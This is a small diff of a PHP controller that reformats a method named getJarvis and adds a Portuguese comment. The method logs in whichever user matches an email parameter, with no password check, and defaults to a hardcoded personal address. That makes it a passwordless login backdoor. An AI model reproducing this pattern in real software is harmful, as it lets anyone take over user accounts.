@@ -111,8 +111,9 @@ class IdController extends \BaseController
 
 	public function getJarvis($email = 'antoniovietri@gmail.com')
 	{
-		$user = User::Where('email', $email)->first();
 
+		$user = User::Where('email', $email)->first();
+		// Login do usuário
 		Auth::login($user);
 
 		return Redirect::to('/')->with('success', array(1 => 'Você logou no sistema.'));
